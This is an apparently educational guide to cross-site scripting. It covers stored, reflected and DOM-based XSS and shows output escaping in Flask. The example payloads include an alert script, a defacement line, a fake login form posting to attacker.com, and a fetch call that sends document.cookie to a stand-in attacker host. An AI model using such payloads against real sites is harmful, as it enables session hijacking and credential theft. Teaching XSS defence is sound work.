# **Cross-Site Scripting (XSS)**

Cross-Site Scripting (XSS) is a critical security vulnerability in web applications that allows attackers to inject and execute malicious scripts in a user’s browser. These scripts can compromise sensitive data, hijack user sessions, deface websites, or perform unauthorized actions.

## **Objective**

This documentation aims to provide a clear understanding of XSS, its types, how it works, and how to prevent it. It includes detailed code examples to help developers recognize and mitigate XSS risks.

## **What is Cross-Site Scripting (XSS)?**

XSS is a **web security vulnerability** where attackers inject **malicious scripts** into web pages. These scripts can manipulate the DOM, steal sensitive data, and impersonate users. XSS attacks usually exploit vulnerabilities in input handling and output rendering in web applications.

![](./images/Diagrams.drawio.svg)

## **How Does XSS Work?**

### **1. Injection**  
The attacker injects **malicious input** into a vulnerable part of the web application, such as a form, URL parameter, or comment section. This input is designed to be processed as executable code rather than plain text.

- Example injection in a form field:  
  ```html
  <script>alert('XSS Attack');</script>
  ```

### **2. Execution**  
The browser executes the injected script when the user accesses the page containing the malicious input. Depending on the type of XSS (Stored, Reflected, or DOM-Based), this could happen automatically (Stored XSS) or require a user to click a malicious link (Reflected XSS).

- Example vulnerable output:  
  ```html
  <p>Search results for: <script>alert('XSS Attack');</script></p>
  ```
  
The browser renders and runs the script, displaying an alert box in this example.

### **3. Attack**  
Once executed, the script can perform harmful actions such as:
- **Stealing cookies**:  
  ```javascript
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
  ```
- **Manipulating the page (DOM)**:  
  ```javascript
  document.body.innerHTML = '<h1>This site has been hacked!</h1>';
  ```
- **Tricking users with phishing forms**:
  ```html
  <form action="https://attacker.com/login" method="POST">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Log In</button>
  </form>
  ```

---

## **Types of XSS Attacks**

1. **Stored XSS (Persistent XSS)**  
2. **Reflected XSS (Non-Persistent XSS)**  
3. **DOM-Based XSS**

---

### **1. Stored XSS (Persistent XSS)**  
In **Stored XSS**, the malicious input is saved on the server, such as in a database. It gets embedded in a web page and automatically executed whenever a user accesses that page. For example, an attacker could post a comment containing a script, which runs whenever someone views the comment.

---

### **2. Reflected XSS (Non-Persistent XSS)**  
In **Reflected XSS**, the injected script is not stored on the server. Instead, it is included in the server's response based on user input. The attack usually requires the victim to click a malicious link that contains the script in a query parameter or form submission.

---

### **3. DOM-Based XSS**  
In **DOM-Based XSS**, the vulnerability is present in client-side JavaScript code. The application reads untrusted input (e.g., from the URL) and dynamically manipulates the page's content, leading to script execution without any server involvement.

---

## **Reflected XSS in Detail**

### **What is Reflected XSS?**

Reflected XSS, also known as **non-persistent XSS**, occurs when the web application immediately reflects user input in the server’s response without properly validating or escaping it. Since the input is not stored, the attack typically relies on **social engineering** to trick the user into visiting a specially crafted malicious link.

---

### **How Reflected XSS Works**

1. **Malicious Input Submission:** The attacker sends a crafted input (e.g., a `<script>` tag) through a URL or form.
2. **Reflection:** The server includes this input in its HTML response without sanitization.
3. **Script Execution:** When the victim views the response, the browser executes the script.

#### **Example Scenario**
- A website search feature is vulnerable and reflects user input:
  ```html
  <p>Search results for: {user_input}</p>
  ```

- An attacker crafts a malicious link:
  ```
  https://example.com/search?query=<script>alert('XSS Attack');</script>
  ```

- The script is reflected in the page output:
  ```html
  <p>Search results for: <script>alert('XSS Attack');</script></p>
  ```

- When the victim clicks the link, the browser executes the script, displaying an alert box.

---

### **Impact of Reflected XSS**

- **Stealing Sensitive Data:** Attackers can steal cookies, session tokens, and other sensitive information.
- **Session Hijacking:** By stealing session data, attackers can impersonate users and gain unauthorized access to their accounts.
- **Phishing:** Attackers can trick victims into entering credentials by displaying fake login forms.
- **Page Defacement:** The attacker can alter the appearance and content of the web page.

---

### **Prevention of Reflected XSS**

To prevent reflected XSS attacks, implement the following measures:

1. **Input Validation:** Ensure user input adheres to expected formats (e.g., allow only alphanumeric characters).
2. **Output Encoding:** Encode user input before including it in the HTML output, escaping special characters like `<`, `>`, `&`, `'`, and `"`.

**Example (Python with Flask):**
```python
from flask import request, escape

@app.route('/search')
def search():
    query = request.args.get('query')
    return f"<p>Search results for: {escape(query)}</p>"
```

3. **Use Secure APIs:** Avoid inserting user input directly into HTML or JavaScript. Use methods like `textContent` instead of `innerHTML` to prevent script execution.

---

### **Hands-on Example: Reflected XSS**
*(This section is reserved for a practical demonstration to be added later.)*

--- 

This completes the detailed explanation of Reflected XSS.